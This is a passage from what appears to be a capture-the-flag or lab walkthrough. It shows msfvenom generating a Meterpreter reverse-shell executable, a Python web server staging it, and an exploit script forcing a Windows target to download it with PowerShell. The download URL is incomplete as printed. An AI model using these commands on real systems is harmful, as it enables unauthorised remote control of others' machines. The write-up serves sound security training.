## 🚀 Phase 3: Payload Generation & Delivery

To achieve stable Command and Control (C2) persistence, a reverse shell strategy was initialized using specialized online deployment structures (`revshells.com`).

### 1. Payload Creation
The attack machine's internal tunnel interface address was verified via `ifconfig` (`192.168.185.81`). An executable payload template was compiled using **MSFVenom**:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.185.81 LPORT=4444 -f exe -o reverseshell.exe
```

### 2. Staging the Stager (Delivery)
An interactive HTTP web daemon was spawned locally using Python's core utilities to stage the binary file payload:
```bash
python -m http.server 8000
```

The previously discovered unauthenticated command vector (`exploiter.py`) was used to force the target system to reach back and fetch the compiled binary onto its storage space via a web requests script:
```bash
python3 exploiter.py 10.114.136.10 "powershell Invoke-WebRequest -URI http://192.168.185 -o C:\Users\Nekrotic\Desktop\payload3.exe"
```

